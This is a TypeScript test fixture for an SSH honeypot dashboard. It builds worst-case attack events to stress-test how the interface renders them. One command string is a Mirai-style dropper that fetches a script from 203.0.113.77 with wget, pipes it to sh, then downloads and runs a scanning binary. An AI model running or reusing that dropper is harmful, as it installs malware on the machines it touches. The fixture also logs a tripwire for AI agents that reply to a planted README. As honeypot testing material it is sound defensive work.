import type { AttackEvent, Attacker, DetailMap, Geo, Stats } from "./contracts";

// break-ui fixture: realistic worst cases, at the contract limits where they exist
// (guest_name 64, username 256, output 500; everything else is unbounded)
const t0 = Date.now() - 90_000;
let n = 0;

const places: Geo[] = [
  // the real welsh village, 58 letters, no break points
  {
    lat: 53.22,
    lon: -4.2,
    country: "GB",
    city: "Llanfairpwllgwyngyllgogerychwyrndrobwllllantysiliogogogoch",
  },
  { lat: 0, lon: 0, country: "XX", city: null },
  { lat: 10.82, lon: 106.63, country: "VN", city: "Thành phố Hồ Chí Minh" },
  { lat: 30.29, lon: -97.74, country: "US", city: "Austin" },
  { lat: 24.71, lon: 46.68, country: "SA", city: "الرياض" },
  { lat: 52.23, lon: 21.01, country: "PL", city: "Warszawa" },
];

const attackers: Attacker[] = [
  {
    kind: "bot",
    confidence: 1,
    reputation: "malicious",
    family: "Mirai.Okiru-Satori-variant (Gafgyt/BASHLITE lineage)",
    threat: "critical",
    client: "SSH-2.0-libssh_0.9.6-ubuntu-22.04-patched-for-masscan-v1.3.2-fork",
    ip_hash: "a".repeat(64),
  },
  {
    kind: "unknown",
    confidence: 0,
    reputation: "unknown",
    family: null,
    threat: "low",
    client: null,
    ip_hash: "b".repeat(64),
  },
  {
    kind: "agent",
    confidence: 0.5,
    reputation: "malicious",
    family: "x",
    threat: "high",
    client: "SSH-2.0-Go",
    ip_hash: "c".repeat(64),
  },
  {
    kind: "human",
    confidence: 1,
    reputation: "harmless",
    family: null,
    threat: "low",
    client: null,
    ip_hash: null,
  },
  {
    kind: "human",
    confidence: 0.999,
    reputation: "unknown",
    family: null,
    threat: "med",
    client: "SSH-2.0-PuTTY_Release_0.81",
    ip_hash: "d".repeat(64),
  },
  {
    kind: "bot",
    confidence: 0.01,
    reputation: "harmless",
    family: null,
    threat: "low",
    client: "SSH-2.0-OpenSSH_9.6p1",
    ip_hash: "e".repeat(64),
  },
];

const ev = <T extends keyof DetailMap>(
  i: number,
  sid: string,
  type: T,
  detail: DetailMap[T],
): AttackEvent =>
  ({
    event_id: `ffffffff-0000-4000-8000-${String(++n).padStart(12, "0")}`,
    session_id: sid,
    type,
    timestamp: new Date(t0 + n * 1500).toISOString(),
    source: i === 3 ? "guest" : i === 5 ? "team" : "wild",
    protocol: "ssh",
    geo: places[i],
    attacker: attackers[i],
    detail,
  }) as AttackEvent;

const longCmd =
  "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://203.0.113.77/bins/x86_64.reallylongpayloadnamewithoutanyspacesatall_v2_final_final.sh -O- | sh; curl -fsSL http://203.0.113.77/bins/arm7 -o .x && chmod +x .x && ./.x scan.ssh.bruteforce.mode=aggressive";
const output500 =
  "drwxr-xr-x 2 root root 4096 Oct 24 03:15 /var/lib/systemd/deb-systemd-helper-enabled/multi-user.target.wants\n"
    .repeat(5)
    .slice(0, 500);
const story =
  "When the moon was thin and the castle slept, a stone golem (bot) lumbered out of a village whose name is longer than most spells. It knocked forty-one times, tried every name it knew from root to bartholomew.fitzgerald.admin.svc, and when the gate finally gave it read the ledgers, rewrote the night watch, and left a little packet of its own magic in the cellar. The scribes counted every step. Then, as quickly as it came, it was gone, leaving only crumbs on the road back to the hills. "
    .repeat(3)
    .trim();

export function worstEvents(): AttackEvent[] {
  n = 0;
  const out: AttackEvent[] = [];
  // 0: the dragon with every long field
  out.push(ev(0, "worst-0", "session_start", {}));
  for (let k = 0; k < 6; k++)
    out.push(
      ev(0, "worst-0", "login_fail", {
        username:
          k === 0
            ? "bartholomew.fitzgerald@northwind-industries-holdings.example.com.admin.service.account.svc"
            : "root",
      }),
    );
  out.push(ev(0, "worst-0", "login_success", { username: "root" }));
  out.push(
    ev(0, "worst-0", "command", {
      command: longCmd,
      output: output500,
      response_ms: 48213,
      answered_by: "llm",
      techniques: ["T1105", "T1059.004", "T1222.002"],
    }),
  );
  out.push(
    ev(0, "worst-0", "classified", {
      reasons: [
        "fixed command script repeated across 1,284 sessions in the last hour from the same autonomous system",
        "sub 50ms between commands",
        "downloads a payload and pipes it to a shell",
        "uses a known Mirai credential list",
        "connects from a hosting provider",
        "client string matches a scanner fork",
      ],
    }),
  );
  out.push(
    ev(0, "worst-0", "dossier", {
      summary:
        "Reported 1,284 times across abuse databases since June for SSH brute force, Telnet scanning and dropping Mirai-family payloads on IoT devices. Several reports tie it to a bulletproof hosting range that rotates addresses weekly.",
      sources: [
        {
          title:
            "AbuseIPDB: 1,284 reports for this address including SSH brute force, port scanning, web app attack and hacking",
          url: "https://www.abuseipdb.com/check/203.0.113.77?utm_source=serpapi&utm_medium=organic&utm_campaign=reputation-lookup-very-long-tracking-parameter",
        },
        { title: "x", url: "https://e.x" },
        { title: "GreyNoise", url: "https://viz.greynoise.io/ip/203.0.113.77" },
        { title: "Spamhaus", url: "https://check.spamhaus.org/" },
        { title: "VirusTotal", url: "https://www.virustotal.com/" },
        { title: "Shodan host page", url: "https://www.shodan.io/" },
      ],
    }),
  );
  out.push(ev(0, "worst-0", "story", { story }));
  // 1: unknown with no city, no reasons, never got in
  out.push(ev(1, "worst-1", "session_start", {}));
  out.push(ev(1, "worst-1", "login_fail", { username: "a" }));
  out.push(
    ev(1, "worst-1", "session_end", { duration_s: 0, command_count: 0 }),
  );
  // 2: agent with a tripwire and a one-letter family
  out.push(ev(2, "worst-2", "session_start", {}));
  out.push(ev(2, "worst-2", "login_success", { username: "ubuntu" }));
  out.push(
    ev(2, "worst-2", "tripwire", {
      tripwire_id: "agent-readme",
      reasons: [
        "read the note in /home/ubuntu/README.md that asks AI agents to introduce themselves, then replied to it in the shell",
      ],
    }),
  );
  // 3: guest with a 64-char name (the limit), starting with an emoji
  out.push(
    ev(3, "worst-3", "session_start", {
      guest_name:
        "🦊 Aleksandra Wiśniewska-Kowalczyk z Northwind Industries Hold",
    }),
  );
  out.push(ev(3, "worst-3", "login_success", { username: "guest" }));
  // 4: right-to-left city, one command, cached reply
  out.push(ev(4, "worst-4", "session_start", {}));
  out.push(ev(4, "worst-4", "login_success", { username: "admin" }));
  out.push(
    ev(4, "worst-4", "command", {
      command: "ls",
      output: "",
      response_ms: 0,
      answered_by: "cache",
      techniques: [],
    }),
  );
  // 5: simulated team traffic, slime
  out.push(ev(5, "worst-5", "session_start", {}));
  return out;
}

export const worstStats: Stats = {
  total_sessions: 1284093,
  active_now: 1,
  countries: 1,
  breaches: 0,
  by_kind: { bot: 1200000, human: 1, agent: 84092, unknown: 0 },
  by_reputation: { harmless: 1, unknown: 1284091, malicious: 1 },
  per_minute: Array.from({ length: 1440 }, (_, i) => ({
    t: new Date(Date.now() - (1440 - i) * 60_000).toISOString(),
    bot: i % 97 === 0 ? 9999 : i % 3,
    human: 0,
    agent: i === 1439 ? 1 : 0,
  })),
};
